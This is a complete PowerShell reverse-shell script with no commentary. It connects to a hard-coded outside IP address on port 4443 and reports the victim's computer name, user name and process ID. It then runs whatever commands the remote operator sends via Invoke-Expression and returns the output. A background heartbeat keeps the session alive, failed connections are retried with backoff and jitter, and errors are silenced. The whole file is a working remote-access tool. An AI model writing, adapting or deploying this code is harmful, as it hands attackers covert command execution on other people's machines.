param(
    [string]$IP = "172.86.80.52",
    [int]$Port = 4443,
    [int]$ReconnectDelay = 5,
    [int]$MaxReconnectDelay = 60,
    [int]$ConnectTimeoutMs = 5000,
    [int]$KeepAliveInterval = 15,
    [switch]$ExitOnQuit
)

$ErrorActionPreference = 'SilentlyContinue'

function Write-Log {
    param([string]$Message)
    $ts = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    Write-Host "[$ts] $Message"
}

function Invoke-RemoteCommand {
    param([string]$Command)
    try {
        $output = & {
            $ErrorActionPreference = 'Continue'
            Invoke-Expression $Command 2>&1
        } | Out-String
        if ([string]::IsNullOrEmpty($output)) { return "" }
        return $output
    }
    catch {
        return "ERROR: " + $_.Exception.Message
    }
}

$currentDelay = $ReconnectDelay

while ($true) {
    $client  = $null
    $stream  = $null
    $writer  = $null
    $reader  = $null
    $hbTask  = $null
    $connected = $false
    $stopHeartbeat = $false

    try {
        Write-Log "Connecting to $IP`:$Port ..."

        $client = New-Object System.Net.Sockets.TCPClient
        $client.NoDelay = $true
        $client.ReceiveTimeout = 0
        $client.SendTimeout    = $KeepAliveInterval * 1000

        $connect = $client.BeginConnect($IP, $Port, $null, $null)
        if (-not $connect.AsyncWaitHandle.WaitOne($ConnectTimeoutMs, $false)) {
            throw "Connection timed out after $ConnectTimeoutMs ms"
        }
        $client.EndConnect($connect)

        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true
        $reader = New-Object System.IO.StreamReader($stream)

        $computerName = $env:COMPUTERNAME
        $userName     = $env:USERNAME
        $banner = [string]::Concat(
            "`n[+] Connected",
            "`n[+] Host: ", $computerName,
            "`n[+] User: ", $userName,
            "`n[+] PID:  ", $PID,
            "`n`n"
        )
        $writer.WriteLine($banner)

        $connected = $true
        $currentDelay = $ReconnectDelay
        Write-Log "Connected."

        $hbState = [hashtable]::Synchronized(@{
            Client = $client
            Interval = $KeepAliveInterval
            Stop = $false
        })

        $hbRunspace = [runspacefactory]::CreateRunspace()
        $hbRunspace.ApartmentState = 'MTA'
        $hbRunspace.ThreadOptions  = 'ReuseThread'
        $hbRunspace.Open()
        $hbRunspace.SessionStateProxy.SetVariable('hbState', $hbState)

        $hbPs = [powershell]::Create()
        $hbPs.Runspace = $hbRunspace
        [void]$hbPs.AddScript({
            param($state)
            while (-not $state.Stop) {
                Start-Sleep -Seconds $state.Interval
                if ($state.Stop) { break }
                try {
                    if ($state.Client -and $state.Client.Connected) {
                        $state.Client.Client.Send([byte[]]@(0)) | Out-Null
                    }
                } catch { break }
            }
        }).AddArgument($hbState)

        $hbTask = $hbPs.BeginInvoke()

        while ($client.Connected) {
            $currentPath = (Get-Location).Path
            $promptText  = [string]::Concat("PS ", $currentPath, "> ")
            $writer.Write($promptText)

            $command = $reader.ReadLine()

            if ($null -eq $command) {
                throw "Connection lost (remote closed or network down)"
            }

            if ($command.Length -eq 0) { continue }

            $commandLower = $command.ToLower().Trim()

            if ($commandLower -eq "exit" -or $commandLower -eq "quit") {
                Write-Log "Exit requested. Closing session."
                if ($ExitOnQuit) {
                    $hbState.Stop = $true
                    return
                }
                break
            }

            $result = Invoke-RemoteCommand -Command $command
            $writer.WriteLine($result)
        }
    }
    catch {
        $msg = $_.Exception.Message
        if ($connected) {
            Write-Log "Session ended: $msg"
        }
        else {
            Write-Log "Connection failed: $msg (retry in ${currentDelay}s)"
        }

        if (-not $connected) {
            $jitter = Get-Random -Minimum 0 -Maximum 3
            Start-Sleep -Seconds ($currentDelay + $jitter)
            $currentDelay = [Math]::Min($currentDelay * 2, $MaxReconnectDelay)
        }
        else {
            $currentDelay = $ReconnectDelay
        }
    }
    finally {
        if ($hbState) { $hbState.Stop = $true }
        if ($hbPs) {
            try { $hbPs.Stop() } catch {}
            try { $hbPs.Dispose() } catch {}
        }
        if ($hbRunspace) {
            try { $hbRunspace.Close() } catch {}
            try { $hbRunspace.Dispose() } catch {}
        }
        foreach ($obj in @($writer, $reader, $stream, $client)) {
            if ($obj) { try { $obj.Dispose() } catch {} }
        }
    }
}
